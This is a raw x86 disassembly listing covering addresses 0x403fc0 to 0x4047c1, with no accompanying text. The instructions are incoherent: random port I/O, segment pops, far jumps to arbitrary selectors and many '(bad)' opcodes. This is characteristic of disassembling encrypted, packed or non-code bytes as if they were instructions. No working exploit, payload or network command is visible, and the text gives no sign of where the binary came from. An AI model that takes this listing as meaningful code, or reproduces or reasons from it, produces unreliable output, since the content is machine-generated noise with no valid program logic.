  403fc0:	and    BYTE PTR ds:0x8a4da6ac,bh
  403fc6:	xchg   DWORD PTR [esi-0x40c1fdc4],esi
  403fcc:	mov    al,0xf0
  403fce:	add    BYTE PTR [ecx-0x75f339fc],bl
  403fd4:	mov    ds:0xd4a7badb,al
  403fd9:	in     eax,0xc0
  403fdb:	pop    es
  403fdc:	push   es
  403fdd:	arpl   dx,bp
  403fdf:	lahf   
  403fe0:	stos   BYTE PTR es:[edi],al
  403fe1:	imul   edx,DWORD PTR [edx],0x246b5764
  403fe7:	pop    esi
  403fe8:	jo     0x403f79
  403fea:	push   esi
  403feb:	data16 test BYTE PTR [esi],0xc9
  403fef:	cmp    BYTE PTR [edx+0x77],bh
  403ff2:	ja     0x404017
  403ff4:	xchg   DWORD PTR [edx+eiz*1],ecx
  403ff7:	nop
  403ff8:	mov    cl,0x89
  403ffa:	sbb    dh,bl
  403ffc:	xchg   edx,eax
  403ffd:	dec    ecx
  403ffe:	inc    edi
  403fff:	dec    ecx
  404000:	mov    esi,0xc97e4feb
  404005:	dec    esi
  404006:	mov    esi,0x337209d
  40400b:	cmp    DWORD PTR [ebx],esi
  40400d:	imul   edx,DWORD PTR [ebx+0x31],0x647d0af8
  404014:	and    DWORD PTR [edx],ebp
  404016:	push   cs
  404017:	pop    ebp
  404018:	ins    DWORD PTR es:[edi],dx
  404019:	outs   dx,DWORD PTR ds:[esi]
  40401a:	fidiv  DWORD PTR [eax]
  40401c:	push   ss
  40401d:	loope  0x40405a
  40401f:	xor    ebx,DWORD PTR [edi+ebp*1]
  404022:	jns    0x404067
  404024:	stos   DWORD PTR es:[edi],eax
  404025:	mov    WORD PTR [ecx+0x7d],?
  404028:	push   0xffffff9b
  40402a:	shr    DWORD PTR [edx],1
  40402c:	and    eax,0x657bcb65
  404031:	push   eax
  404032:	cwde   
  404033:	fcom   QWORD PTR [edx]
  404035:	xchg   edx,eax
  404036:	nop
  404037:	fwait
  404038:	pushf  
  404039:	push   0x958b9c71
  40403e:	push   edx
  40403f:	fld    QWORD PTR [esp+edi*8-0x16]
  404043:	lock mov ch,0xd0
  404046:	repz sub ecx,DWORD PTR [ebp+0x66ac58bc]
  40404d:	xchg   ebp,eax
  40404e:	pop    eax
  40404f:	fild   DWORD PTR [ebx-0x1efcfa92]
  404055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404056:	mov    ebx,esp
  404058:	rcr    BYTE PTR [edi-0x15f4823],1
  40405e:	out    dx,eax
  40405f:	xor    al,BYTE PTR [edx+0x18771270]
  404065:	repz and DWORD PTR [edi-0x6be76ac1],edi
  40406c:	popf   
  40406d:	push   ebx
  40406e:	mov    ebp,0xdc9ec2c4
  404073:	or     esi,DWORD PTR [ebx+0x3828dc7d]
  404079:	mov    al,ds:0x7ba17826
  40407e:	pop    edx
  40407f:	ins    BYTE PTR es:[edi],dx
  404080:	jbe    0x40406d
  404082:	mov    dh,0x25
  404084:	outs   dx,BYTE PTR ds:[esi]
  404085:	adc    eax,0xb5f65c7f
  40408a:	ret    
  40408b:	xchg   bl,cl
  40408d:	adc    BYTE PTR [ebp+0x5d4b0d49],0x31
  404094:	and    bh,cl
  404096:	aaa    
  404097:	mov    ebx,0xfcad92aa
  40409c:	pop    ds
  40409d:	mov    bh,0xa0
  40409f:	lods   al,BYTE PTR ds:[esi]
  4040a0:	pop    ax
  4040a2:	loopne 0x404065
  4040a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040a5:	and    BYTE PTR [eax-0xef4fafc],ah
  4040ab:	inc    ebx
  4040ac:	pop    eax
  4040ad:	cmp    DWORD PTR ds:0x235d6432,esi
  4040b3:	stos   DWORD PTR es:[edi],eax
  4040b4:	mov    bh,0x19
  4040b6:	dec    eax
  4040b7:	retf   0x4f10
  4040ba:	movd   DWORD PTR [edx-0x2fc66135],mm7
  4040c1:	pusha  
  4040c2:	test   eax,0x55cf05b0
  4040c7:	mov    ah,0x4e
  4040c9:	mov    edi,esi
  4040cb:	add    BYTE PTR [ebx],cl
  4040cd:	push   cs
  4040ce:	xor    BYTE PTR [ecx+0x5a],ah
  4040d1:	lods   al,BYTE PTR ds:[esi]
  4040d2:	xchg   DWORD PTR [edx-0x47],ebx
  4040d5:	out    0x98,al
  4040d7:	sub    esi,DWORD PTR [ebx-0x1b1c1ffe]
  4040dd:	mov    al,ds:0x3711d46f
  4040e2:	in     eax,0x28
  4040e4:	je     0x404098
  4040e6:	sbb    eax,0xd4ff0dfe
  4040eb:	mov    dh,0xd1
  4040ed:	mov    ds:0x1063cd87,eax
  4040f2:	inc    esi
  4040f3:	mov    edi,0x268688b9
  4040f8:	mov    al,ds:0x9628df21
  4040fd:	out    dx,al
  4040fe:	cmc    
  4040ff:	ret    0x66a7
  404102:	push   ss
  404103:	and    eax,0x99c8f65c
  404108:	iret   
  404109:	sub    eax,0x584d783b
  40410e:	inc    edx
  40410f:	dec    esi
  404110:	popa   
  404111:	fwait
  404112:	pop    esi
  404113:	and    bh,bh
  404115:	pop    ecx
  404116:	sahf   
  404117:	(bad)
  40411a:	cmp    BYTE PTR [ebx-0x3d],cl
  40411d:	mov    ebx,0x73d2471
  404122:	out    0x2a,al
  404124:	fadd   DWORD PTR [edx+ecx*1]
  404127:	aas    
  404128:	pop    ebp
  404129:	mov    ecx,0xe219c1e2
  40412e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40412f:	aaa    
  404130:	fstp   TBYTE PTR [edx-0x4d]
  404133:	mov    ebx,0xeacea4d3
  404138:	or     BYTE PTR [ebp*1-0xd83b658],cl
  40413f:	das    
  404140:	in     al,0xf1
  404142:	xor    al,BYTE PTR [ebx-0x261b6117]
  404148:	jns    0x4040e4
  40414a:	daa    
  40414b:	mov    fs,eax
  40414d:	jns    0x404160
  40414f:	in     eax,0x85
  404151:	adc    DWORD PTR [ecx+0xca0eb8e],0x5b
  404158:	lods   al,BYTE PTR ds:[esi]
  404159:	mov    eax,ds:0x6dd617dc
  40415e:	and    al,0x70
  404160:	aas    
  404161:	pop    edi
  404162:	mov    ecx,esp
  404164:	neg    DWORD PTR [eax+0x1f]
  404167:	and    bl,BYTE PTR [edx-0x44eec4ad]
  40416d:	in     eax,dx
  40416e:	out    0xd3,eax
  404170:	mov    bh,0xc8
  404172:	out    dx,eax
  404173:	dec    esi
  404174:	and    al,0x33
  404176:	pop    edi
  404177:	std    
  404178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404179:	fild   DWORD PTR [esi-0x3ef96a1a]
  40417f:	and    BYTE PTR [ecx],al
  404181:	mov    fs,WORD PTR [edi-0x103fd29]
  404187:	sub    ebx,DWORD PTR [ebp+edx*1+0x58]
  40418b:	aas    
  40418c:	test   DWORD PTR [esi-0x4c55b2f8],ebp
  404192:	sub    BYTE PTR [ecx],dh
  404194:	shr    esi,0x31
  404197:	mov    ds:0xa903a9d9,eax
  40419c:	jl     0x4041ef
  40419e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40419f:	ds jp  0x4041e9
  4041a2:	enter  0xdc5d,0x94
  4041a6:	das    
  4041a7:	adc    al,0x95
  4041a9:	mov    BYTE PTR [edi+0x707b4a05],cl
  4041af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041b0:	ficomp WORD PTR [esi-0x2]
  4041b3:	push   ebx
  4041b4:	repz retf 0xf961
  4041b8:	push   esi
  4041b9:	frstor [edi-0x78e8c1b1]
  4041bf:	mov    BYTE PTR [ebx+0x250cf1a4],cl
  4041c5:	sbb    esp,esp
  4041c7:	cmp    edi,eax
  4041c9:	push   edx
  4041ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041cb:	popa   
  4041cc:	push   ecx
  4041cd:	jne    0x404192
  4041cf:	xlat   BYTE PTR ds:[ebx]
  4041d0:	xor    al,0x18
  4041d2:	test   eax,0x69da8328
  4041d7:	push   esi
  4041d8:	loope  0x40418d
  4041da:	dec    ebx
  4041db:	or     ah,BYTE PTR [esi+0x52]
  4041de:	mov    bl,BYTE PTR [ebx+0x0]
  4041e1:	bound  edi,QWORD PTR [edx+ebx*2]
  4041e4:	ffree  st(2)
  4041e6:	xor    BYTE PTR [ebx+0x317758c7],bh
  4041ec:	dec    edi
  4041ed:	push   0x1c55432b
  4041f2:	and    BYTE PTR ss:[ecx+0x27a7fb99],0xb8
  4041fa:	popf   
  4041fb:	out    0x19,al
  4041fd:	inc    esi
  4041fe:	jp     0x404206
  404200:	lods   al,BYTE PTR ds:[esi]
  404201:	out    dx,al
  404202:	out    dx,eax
  404203:	lods   al,BYTE PTR ds:[esi]
  404204:	retf   0x236a
  404207:	icebp  
  404208:	das    
  404209:	pop    ebx
  40420a:	mov    cl,0xdc
  40420c:	mov    eax,ds:0xb31bc0f7
  404211:	in     al,dx
  404212:	push   ds
  404213:	xchg   bp,ax
  404215:	hlt    
  404216:	jecxz  0x40420c
  404218:	pop    eax
  404219:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40421b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40421c:	dec    esi
  40421d:	add    eax,0xf8c8b3e5
  404222:	cld    
  404223:	push   ebp
  404224:	cmp    eax,esp
  404226:	jb     0x40429a
  404228:	or     ebx,DWORD PTR [edx-0x4677c4b2]
  40422e:	sub    DWORD PTR [ebx+0x72279ad2],edx
  404234:	test   al,0x3d
  404236:	pop    es
  404237:	ins    DWORD PTR es:[edi],dx
  404238:	push   ebx
  404239:	cli    
  40423a:	jno    0x4042bb
  40423c:	mov    esi,0xdfdcf34
  404241:	push   0x92963ff2
  404246:	cdq    
  404247:	ins    DWORD PTR es:[edi],dx
  404248:	and    ch,BYTE PTR [ebp-0x49]
  40424b:	(bad)  [edi]
  40424d:	(bad)
  404250:	xor    al,0x75
  404252:	test   bl,al
  404254:	pop    esi
  404255:	inc    eax
  404256:	push   0x4baf183d
  40425b:	mov    dh,0x86
  40425d:	pop    ebx
  40425e:	out    dx,al
  40425f:	ds jns 0x4042af
  404262:	xor    cl,BYTE PTR [ebx]
  404264:	pop    ebx
  404265:	mov    cl,0x18
  404267:	push   ds
  404268:	mov    ?,WORD PTR [ecx-0x15]
  40426b:	ret    
  40426c:	mov    ds:0x22071e23,al
  404271:	cmp    eax,0x52eb18ff
  404276:	retf   
  404277:	gs sub al,0x22
  40427a:	lods   eax,DWORD PTR cs:[esi]
  40427c:	push   0x9
  40427e:	adc    DWORD PTR [edi-0x3c],0x85c2e63
  404285:	mov    al,0x50
  404287:	xor    al,0x41
  404289:	dec    eax
  40428a:	stc    
  40428b:	test   BYTE PTR [edi],ch
  40428d:	ror    DWORD PTR [edi+0x18],1
  404290:	mov    dl,0xd2
  404292:	aam    0x90
  404294:	fidivr DWORD PTR [ebx-0x61b40e3b]
  40429a:	sbb    eax,DWORD PTR [ecx+0x61b4660b]
  4042a0:	or     al,0x1e
  4042a2:	mov    dl,BYTE PTR [ecx-0x26]
  4042a5:	push   ebx
  4042a6:	push   ds
  4042a7:	jl     0x404276
  4042a9:	xor    al,0xe2
  4042ab:	icebp  
  4042ac:	cli    
  4042ad:	pushf  
  4042ae:	inc    edi
  4042af:	jne    0x404310
  4042b1:	dec    ebx
  4042b2:	inc    esp
  4042b3:	jle    0x404265
  4042b5:	repnz mov ds:0x90d1265e,al
  4042bb:	mov    eax,0x1312b384
  4042c0:	jmp    0xa5122cba
  4042c5:	or     al,0xef
  4042c7:	(bad)  
  4042c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042c9:	aam    0xef
  4042cb:	push   ss
  4042cc:	xchg   ah,dl
  4042ce:	repz call 0x58ee:0xeb8e7401
  4042d6:	push   esp
  4042d7:	xchg   ebp,eax
  4042d8:	clc    
  4042d9:	jg     0x404278
  4042db:	cmp    bl,BYTE PTR [esi-0x4ae186]
  4042e1:	rcr    BYTE PTR [ebx+0x54],1
  4042e4:	add    DWORD PTR ds:0x6c408461,ecx
  4042ea:	push   ds
  4042eb:	xchg   ebx,eax
  4042ec:	xchg   DWORD PTR [ebx+0x2364e4b5],edx
  4042f2:	(bad)  
  4042f3:	(bad)  
  4042f4:	test   al,0xc5
  4042f6:	xchg   edx,eax
  4042f7:	mov    ds:0x407ac378,eax
  4042fc:	not    ah
  4042fe:	lods   al,BYTE PTR ds:[esi]
  4042ff:	mov    ebp,0xc7b5d7da
  404304:	sub    BYTE PTR [edx],dl
  404306:	inc    esi
  404307:	push   esp
  404308:	xor    bh,cl
  40430a:	cmp    DWORD PTR [ecx],esi
  40430c:	stc    
  40430d:	call   0x35a4097e
  404312:	cdq    
  404313:	hlt    
  404314:	pop    esi
  404315:	shl    dl,cl
  404317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404318:	and    edx,DWORD PTR [edx-0x1f86cdb8]
  40431e:	mov    eax,ds:0xb29a221f
  404323:	andnps xmm6,xmm2
  404326:	add    al,0xfb
  404328:	mov    ah,bl
  40432a:	xor    ebx,DWORD PTR [ebx]
  40432c:	xor    al,0xad
  40432e:	movzx  ecx,BYTE PTR [ecx+0xc]
  404332:	xchg   edx,eax
  404333:	mov    al,ds:0xed56e5a4
  404338:	ins    DWORD PTR es:[edi],dx
  404339:	aas    
  40433a:	push   es
  40433b:	jmp    0x404302
  40433d:	leave  
  40433e:	sar    BYTE PTR [edi-0x67c112f5],cl
  404344:	mov    bh,0x59
  404346:	adc    ah,BYTE PTR [eax]
  404348:	pop    ds
  404349:	rcl    DWORD PTR [esi+ecx*2+0xa5c182],0xa
  404351:	push   edx
  404352:	mov    al,ds:0xb6da558f
  404357:	mov    al,0x78
  404359:	mov    ds:0xff8be9c6,al
  40435e:	rcr    dl,cl
  404360:	or     esi,eax
  404362:	sbb    al,0x85
  404364:	or     DWORD PTR ds:0x16f6cc5c,ebx
  40436a:	add    eax,0x14016165
  40436f:	xor    DWORD PTR [edi+0x525a8a7],esi
  404375:	out    dx,al
  404376:	cmp    esi,DWORD PTR [esi]
  404378:	xchg   ebp,eax
  404379:	cmp    cl,BYTE PTR [ebx-0x3544accc]
  40437f:	pop    esi
  404380:	mov    bh,0x30
  404382:	cwde   
  404383:	inc    esi
  404384:	loope  0x40433a
  404386:	hlt    
  404387:	inc    ebp
  404388:	ror    BYTE PTR [esi+0x37e71ecf],cl
  40438e:	addr16 mov edi,0xd180d279
  404394:	pop    bx
  404397:	cmp    ecx,DWORD PTR [edi+0x3e]
  40439a:	sbb    eax,0xea6ea173
  40439f:	or     ecx,0x164b7fea
  4043a5:	xor    ebx,eax
  4043a7:	mov    dh,cl
  4043a9:	mov    ds:0x561e60a8,eax
  4043ae:	addr16 in eax,dx
  4043b0:	cwde   
  4043b1:	pop    ebp
  4043b2:	push   ds
  4043b3:	retf   
  4043b4:	push   0xffffffa5
  4043b6:	or     esp,DWORD PTR [esi-0x5]
  4043b9:	in     al,0x3f
  4043bb:	sbb    BYTE PTR [esi+0x38],0x8e
  4043bf:	nop
  4043c0:	outs   dx,BYTE PTR ds:[esi]
  4043c1:	lods   al,BYTE PTR ds:[esi]
  4043c2:	das    
  4043c3:	pop    esi
  4043c4:	pop    ss
  4043c5:	nop
  4043c6:	bound  esi,QWORD PTR [edi+0x2c2d022]
  4043cc:	sub    ebx,DWORD PTR [ecx]
  4043ce:	or     al,ah
  4043d0:	push   edi
  4043d1:	sub    ebp,DWORD PTR [edi]
  4043d3:	fbld   TBYTE PTR [ecx]
  4043d5:	clc    
  4043d6:	shl    BYTE PTR [ebx],1
  4043d8:	mov    eax,0x3d7aa5bd
  4043dd:	test   eax,0x551d0181
  4043e2:	arpl   WORD PTR [esi+0x3b],ax
  4043e5:	mov    dh,0x19
  4043e7:	pusha  
  4043e8:	jbe    0x4043c4
  4043ea:	shl    DWORD PTR [ebx-0x6b8f2d05],0x69
  4043f1:	cmc    
  4043f2:	pop    ds
  4043f3:	dec    ecx
  4043f4:	popa   
  4043f5:	jmp    0x404442
  4043f7:	mov    dl,0xe1
  4043f9:	xor    DWORD PTR [edx+0x50f0804b],ecx
  4043ff:	xchg   esi,eax
  404400:	sbb    DWORD PTR [esi],eax
  404402:	xchg   esi,eax
  404403:	inc    esi
  404404:	aad    0xe5
  404406:	fwait
  404407:	inc    esi
  404408:	pop    ebp
  404409:	ret    
  40440a:	jle    0x40448b
  40440c:	and    dh,dl
  40440e:	xchg   BYTE PTR [esp+ecx*1-0x494fce0e],al
  404415:	test   al,0x22
  404417:	adc    dh,dl
  404419:	sub    eax,0x3bce28dd
  40441e:	test   DWORD PTR [esi-0x51],edi
  404421:	test   al,0x0
  404423:	sbb    al,0xba
  404425:	imul   edi,DWORD PTR [ebx+ebx*4],0x2422a138
  40442c:	jo     0x404457
  40442e:	jno    0x404461
  404430:	and    DWORD PTR [ecx-0x1c6da81e],0x7d
  404437:	arpl   WORD PTR [edx-0x5d],di
  40443a:	inc    edi
  40443b:	mov    edx,0xc00695f4
  404440:	or     bl,BYTE PTR [edx-0x57fbb4b7]
  404446:	xlat   BYTE PTR ds:[ebx]
  404447:	inc    edx
  404448:	mov    dh,0x22
  40444a:	pop    esp
  40444b:	mov    dh,0x36
  40444d:	imul   edx,DWORD PTR [eax+0x65],0x8946e622
  404454:	in     eax,0x63
  404456:	and    DWORD PTR [edx+0x25],edi
  404459:	xchg   esp,eax
  40445a:	jne    0x4044bd
  40445c:	setl   BYTE PTR [edi+0x6c]
  404460:	addr16 ret 0x6e2a
  404464:	in     al,dx
  404465:	les    esp,FWORD PTR [edi]
  404467:	sub    DWORD PTR [edx+0x48],ecx
  40446a:	and    eax,0x34175e3a
  40446f:	call   0xd73254f0
  404474:	sub    ah,0x83
  404477:	stc    
  404478:	arpl   WORD PTR [ebx-0x70],ax
  40447b:	out    dx,al
  40447c:	sbb    BYTE PTR [eax+0x4f1f878b],cl
  404482:	test   DWORD PTR [eax+0x2e3d173b],ebx
  404488:	xchg   ecx,eax
  404489:	out    dx,eax
  40448a:	hlt    
  40448b:	add    eax,DWORD PTR [edx+ecx*1-0x1f5f7475]
  404492:	pop    esp
  404493:	retf   0x18cd
  404496:	inc    ecx
  404497:	movd   mm1,DWORD PTR [edx+0x79]
  40449b:	adc    edx,ebp
  40449d:	mov    ebp,0x88ac20bb
  4044a2:	pop    eax
  4044a3:	xor    eax,0xc2c6b339
  4044a8:	inc    esp
  4044a9:	gs cmc 
  4044ab:	adc    ecx,DWORD PTR [edi+edi*1-0x28]
  4044af:	jne    0x40449c
  4044b1:	fisub  WORD PTR [ecx+edi*4-0x47f1ad80]
  4044b8:	rcl    DWORD PTR [ebx+0x66c2bdb9],0x16
  4044bf:	jecxz  0x404498
  4044c1:	mov    bh,BYTE PTR ds:0xbda2a4ae
  4044c7:	rol    DWORD PTR [edx+0x7e8ecbf2],0xcc
  4044ce:	bound  ebx,QWORD PTR [ecx+0x28]
  4044d1:	je     0x4044fa
  4044d3:	mov    eax,0x1747ec50
  4044d8:	adc    al,0xbe
  4044da:	adc    al,0x16
  4044dc:	repnz mov bh,0xa9
  4044df:	jnp    0x404524
  4044e1:	shr    DWORD PTR ds:0xdb2b778,0xa8
  4044e8:	or     DWORD PTR [eax+0x728ed069],eax
  4044ee:	in     eax,dx
  4044ef:	pop    ecx
  4044f0:	fild   WORD PTR [esi-0x1a]
  4044f3:	mov    ah,0xcd
  4044f5:	cmp    BYTE PTR [ebx+0x4c382379],0xa0
  4044fc:	ins    BYTE PTR es:[edi],dx
  4044fd:	std    
  4044fe:	adc    DWORD PTR [esi+0x2b457292],0x2ea5c733
  404508:	push   edi
  404509:	stos   BYTE PTR es:[edi],al
  40450a:	out    dx,eax
  40450b:	mov    ebx,edi
  40450d:	sbb    bh,bh
  40450f:	adc    bl,ch
  404511:	inc    esi
  404512:	ja     0x404500
  404514:	mov    DWORD PTR [eax-0x5c0d50b4],esp
  40451a:	add    BYTE PTR [eax+esi*1],bl
  40451d:	aad    0x37
  40451f:	jmp    0x2eb:0xc541cc5e
  404526:	adc    eax,DWORD PTR [ebx]
  404528:	fmul   QWORD PTR [ecx]
  40452a:	push   esi
  40452b:	xor    esp,DWORD PTR [eax+0x6e]
  40452e:	test   edx,esi
  404530:	retf   0xd56
  404533:	push   eax
  404534:	rcr    DWORD PTR [ecx-0x4f],0x2
  404538:	cwde   
  404539:	push   ebp
  40453a:	rcr    DWORD PTR [edi-0x26873d9d],0x38
  404541:	xchg   ebp,eax
  404542:	enter  0xfe5d,0x7e
  404546:	rcl    DWORD PTR [edx],1
  404548:	popf   
  404549:	inc    esi
  40454a:	sbb    al,0x31
  40454c:	dec    esi
  40454d:	out    0x14,eax
  40454f:	dec    ebp
  404550:	int3   
  404551:	pop    edi
  404552:	cdq    
  404553:	jp     0x404567
  404555:	(bad)  
  404556:	xor    DWORD PTR [eax+edi*8],edx
  404559:	pop    ss
  40455a:	pop    ax
  40455c:	(bad)  [ebx+0x41]
  40455f:	add    al,0x4d
  404561:	mov    bl,0x0
  404563:	sub    DWORD PTR [ecx-0x45],ebp
  404566:	pop    ds
  404567:	call   0xfa149da3
  40456c:	and    eax,0x3e8ffa50
  404571:	arpl   di,cx
  404573:	aas    
  404574:	(bad)  
  404575:	sbb    BYTE PTR [esi+0x7b6c4111],dh
  40457b:	aad    0x5
  40457d:	add    eax,DWORD PTR [edi]
  40457f:	jge    0x4045cd
  404581:	aam    0x37
  404583:	mov    ch,0xb0
  404585:	dec    edx
  404586:	pusha  
  404587:	mov    esp,0xab2aa0c4
  40458c:	xchg   ebp,eax
  40458d:	mov    ebp,0x9b5ab4b
  404592:	mov    edx,0x70b5587c
  404597:	push   ds
  404598:	add    bl,0xb2
  40459b:	stos   BYTE PTR es:[edi],al
  40459c:	inc    BYTE PTR [esi-0x6f45ab47]
  4045a2:	ins    DWORD PTR es:[edi],dx
  4045a3:	hlt    
  4045a4:	sub    eax,0x39ea8291
  4045a9:	xchg   ebp,eax
  4045aa:	cmp    edi,DWORD PTR [edi+0x15]
  4045ad:	jecxz  0x40457b
  4045af:	jp     0x4045a1
  4045b1:	sbb    BYTE PTR [edi],ah
  4045b3:	pop    esi
  4045b4:	(bad)  
  4045b5:	mov    ecx,0xf516e2c1
  4045ba:	retf   0xc88b
  4045bd:	pop    edi
  4045be:	in     al,0x1e
  4045c0:	ds mov ecx,0x9581034a
  4045c6:	xchg   ebx,eax
  4045c7:	arpl   WORD PTR [ebp-0x7c9689],si
  4045cd:	pop    bx
  4045cf:	sub    al,0x44
  4045d1:	adc    eax,0xb5ecddb1
  4045d6:	jmp    0x404621
  4045d8:	cmp    eax,0x8014699c
  4045dd:	daa    
  4045de:	loope  0x4045b1
  4045e0:	add    eax,0xc77dc741
  4045e5:	out    dx,eax
  4045e6:	test   eax,0xbcef0ff8
  4045eb:	mov    edi,0x765c8267
  4045f0:	ror    ebx,0x85
  4045f3:	mov    eax,ds:0xb6a8777
  4045f8:	(bad)  
  4045f9:	jmp    0x4045bc
  4045fb:	cmp    DWORD PTR [ebx],0xffffffae
  4045fe:	clc    
  4045ff:	pop    esp
  404600:	nop
  404601:	pop    esp
  404602:	into   
  404603:	shl    DWORD PTR [ebx+eax*2],cl
  404606:	js     0x4045d6
  404608:	mov    edx,0x8f8eb265
  40460d:	mov    bl,0xe1
  40460f:	imul   ebx,DWORD PTR [eax+0x3c],0x1f3cce66
  404616:	xor    DWORD PTR [ebp+0x148ff78e],ebp
  40461c:	cmp    ch,BYTE PTR [edi-0x65]
  40461f:	jecxz  0x40466b
  404621:	test   BYTE PTR [eax+0x21011492],ah
  404627:	enter  0xebe2,0x70
  40462b:	xchg   ecx,eax
  40462c:	cmp    bh,dl
  40462e:	pusha  
  40462f:	sub    ah,BYTE PTR [eax+ebp*2]
  404632:	mov    ch,0x78
  404634:	cmp    ebp,0x673551ac
  40463a:	pop    edi
  40463b:	or     eax,0xc474dc5c
  404640:	in     eax,0x50
  404642:	imul   DWORD PTR [edx-0x2e]
  404645:	jge    0x4045e0
  404647:	or     esi,ecx
  404649:	cmp    dl,BYTE PTR ds:0x7ff8a65c
  40464f:	sub    al,0xd4
  404651:	adc    eax,0xd6715917
  404656:	sbb    edi,DWORD PTR [edi+0x69]
  404659:	mov    cl,0xbc
  40465b:	arpl   WORD PTR [eax],di
  40465d:	inc    ebp
  40465e:	xor    ecx,DWORD PTR [edi+0x3b681f2]
  404664:	repz push edi
  404666:	inc    ecx
  404667:	xchg   esi,eax
  404668:	xor    ebx,DWORD PTR ds:0xe4ed6b38
  40466e:	stos   DWORD PTR es:[edi],eax
  40466f:	mov    cl,0x66
  404671:	ins    BYTE PTR es:[edi],dx
  404672:	mov    DWORD PTR [eax-0x9],ebx
  404675:	test   al,0xa4
  404677:	rcr    BYTE PTR [ebp+0x11],1
  40467a:	pop    edi
  40467b:	lock in eax,dx
  40467d:	and    ebp,DWORD PTR [ebx+0x8]
  404680:	xor    ebx,esi
  404682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404683:	add    DWORD PTR [eax+esi*8-0x19],esi
  404687:	sbb    ch,BYTE PTR [ebp+0x5dc1c9ad]
  40468d:	sub    BYTE PTR [ebx-0x40],bh
  404690:	dec    edx
  404691:	adc    DWORD PTR [ebp+0xd91a282],edi
  404697:	xchg   ebx,eax
  404698:	jp     0x404627
  40469a:	(bad)  
  40469b:	leave  
  40469c:	xor    DWORD PTR [edx-0x163d9a9a],ebx
  4046a2:	es addr16 es cmp eax,0x494b3a1b
  4046aa:	idiv   BYTE PTR [ecx+esi*4]
  4046ad:	shr    DWORD PTR [eax-0x52],cl
  4046b0:	cwde   
  4046b1:	mov    al,0xc
  4046b3:	cmp    eax,0x30eaf346
  4046b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046b9:	iret   
  4046ba:	dec    ebp
  4046bb:	in     al,0xa
  4046bd:	xor    al,0xe1
  4046bf:	popa   
  4046c0:	cmc    
  4046c1:	xchg   ebx,eax
  4046c2:	cmp    eax,0xfbe2315e
  4046c7:	xchg   esi,eax
  4046c8:	add    ch,bl
  4046ca:	sub    al,BYTE PTR [esp+ecx*1-0x3a12ac42]
  4046d1:	std    
  4046d2:	sbb    BYTE PTR [esi+0x67],bh
  4046d5:	jle    0x40472d
  4046d7:	and    DWORD PTR [ebp+0x3471eeac],eax
  4046dd:	add    edx,DWORD PTR [esi-0x712b7dec]
  4046e3:	mov    ebx,0x1e550c2
  4046e8:	dec    esp
  4046e9:	push   edx
  4046ea:	cmp    DWORD PTR [eax+0x33],0xe08e8208
  4046f1:	mov    ebp,0xf1225e5
  4046f6:	add    eax,0x37a048f2
  4046fb:	jecxz  0x404779
  4046fd:	les    edi,FWORD PTR [eax+ebx*1+0x5a8f632c]
  404704:	fnstcw WORD PTR [esi+edi*2-0xa]
  404708:	in     al,0xa6
  40470a:	pop    edi
  40470b:	jo     0x404716
  40470d:	stc    
  40470e:	adc    BYTE PTR [edx],bl
  404710:	call   0x703e:0xc69537b7
  404717:	lahf   
  404718:	push   ebp
  404719:	sbb    dl,BYTE PTR [ebp+0x483061f3]
  40471f:	popa   
  404720:	sar    DWORD PTR [esi],1
  404722:	scas   eax,DWORD PTR es:[edi]
  404723:	mov    ds:0x2b7f1ba9,eax
  404728:	or     eax,DWORD PTR [edx]
  40472a:	mov    al,0xb9
  40472c:	pop    ss
  40472d:	sbb    DWORD PTR [ebx],esp
  40472f:	sbb    dl,BYTE PTR [eax+0x70]
  404732:	mov    bl,0x88
  404734:	stos   DWORD PTR es:[edi],eax
  404735:	std    
  404736:	leave  
  404737:	sbb    BYTE PTR [edx-0x29],ch
  40473a:	or     eax,0xa5e3235b
  40473f:	ss retf 
  404741:	adc    BYTE PTR [edx],ch
  404743:	fs pusha 
  404745:	mov    esp,DWORD PTR [ebx-0x3b124c9d]
  40474b:	out    0x9c,eax
  40474d:	adc    al,0x36
  40474f:	sbb    bh,ah
  404751:	push   ecx
  404752:	add    ah,BYTE PTR [ecx]
  404754:	xor    eax,0x8777b3dd
  404759:	cmp    al,0xd0
  40475b:	jmp    0x92a8:0xa6dc4fbf
  404762:	lahf   
  404763:	sbb    DWORD PTR [eax-0x22dd11b5],0xffffffd4
  40476a:	mov    BYTE PTR [edi+ecx*1],al
  40476d:	pop    ebx
  40476e:	ins    BYTE PTR es:[edi],dx
  40476f:	in     al,0x22
  404771:	add    edi,0x829d20b5
  404777:	add    eax,0x7c6bf144
  40477c:	lods   eax,DWORD PTR ds:[esi]
  40477d:	xor    al,0xa6
  40477f:	adc    BYTE PTR [eax+0x70],ch
  404782:	xor    edx,esp
  404784:	loopne 0x4047d2
  404786:	cmp    esi,esi
  404788:	sbb    al,0x52
  40478a:	xchg   ebp,eax
  40478b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40478d:	js     0x40471e
  40478f:	iret   
  404790:	xchg   ebp,eax
  404791:	and    al,0x45
  404793:	cmp    dl,BYTE PTR [edi+0x5c]
  404796:	or     bl,BYTE PTR [esi]
  404798:	outs   dx,BYTE PTR ds:[esi]
  404799:	or     bh,BYTE PTR [esi]
  40479b:	push   ss
  40479c:	push   0xffffffc0
  40479e:	aam    0xd3
  4047a0:	mov    ah,0xeb
  4047a2:	xor    BYTE PTR [ebx-0xd],dh
  4047a5:	dec    edi
  4047a6:	pop    edi
  4047a7:	adc    eax,DWORD PTR [edi]
  4047a9:	aas    
  4047aa:	icebp  
  4047ab:	aas    
  4047ac:	int3   
  4047ad:	and    al,BYTE PTR [edi+0x7432b5eb]
  4047b3:	mov    eax,0x698c619f
  4047b8:	push   cs
  4047b9:	add    esp,DWORD PTR [esi+0x23115575]
  4047bf:	repz daa 
  4047c1:	cmp    eax,0x262e1ea1
